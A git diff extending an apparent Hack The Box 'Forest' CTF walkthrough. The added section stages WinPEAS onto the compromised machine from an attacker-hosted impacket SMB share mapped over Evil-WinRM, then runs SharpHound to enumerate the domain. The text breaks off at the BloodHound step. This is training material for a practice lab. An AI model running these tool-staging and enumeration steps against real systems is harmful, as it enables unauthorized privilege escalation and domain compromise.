@@ -3,7 +3,7 @@ title: Hack The Box - CTF Lab - Forest - Easy
 date: 2025-04-08 00:00:01 +0800
 image: /images/HackTheBoxForest.jpg
 categories: [HTB Labs]
-tags: [CPTS, Easy]
+tags: [CPTS, Easy, Retired]
 ---
 This is the first HackTheBox CTF lab in the famous Ippsec's unofficial CPTS preparation playlist. I will attempt to blog all 20 boxes in the playlist; this is the first of 20 boxes. 
 
@@ -411,4 +411,31 @@ Mode                LastWriteTime         Length Name
 *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cat user.txt
 c095053e015dee428a9697e25dde73da
 ```
+
+We see the user folders sebastien and Administrator but we do not have the permission to cd to them. Since we already have a domain user account, what we need is to escalate to SYSTEM. We can try using WinPEAS which will automatically scan for privilege escalation paths in a Windows machine. 
+
+We  go on github and clone the winpeas repository and copy it as a folder on our local attack box:
+```
+git clone https://github.com/peass-ng/PEASS-ng
+```
+
+We then will setup an SMB server in the winpeas directory so that we upload the WinPEAS script through the open SMB service using impacket:
+```
+sudo smbserver.py localserver $(pwd) -smb2support -user kchen -password 123
+```
+Back on Win-RM, we need to create a PSCredential so that we can use it as authentication when connecting to our SMB server.
+```
+$pass = convertto-securestring '123' -AsPlainText -Force
+$pass
+$cred = New-Object System.Management.Automation.PSCredential('kchen',$pass)
+New-PSDrive -Name kchen -PSProvider FileSystem -Credential $cred -Root \\10.10.14.2
+```
+We successfully connect, and use the move command "mv" to move files around. We then move WinPEAS64.exe from our attack box to the forest box. We probably could just use Evil-WinRM's upload and download function as well. After WinPEAS runs, it gives us a bunch of information but nothing that we can really use.
+
+We next try using SharpHound to enumerate the entire domain. We upload SharpHound.exe to the box and run it with 
+```
+SharpHound.exe -c All 
+```
+
+We then run Bloodhound and upload the data from the zip file. We search for svc-alfresco 
 
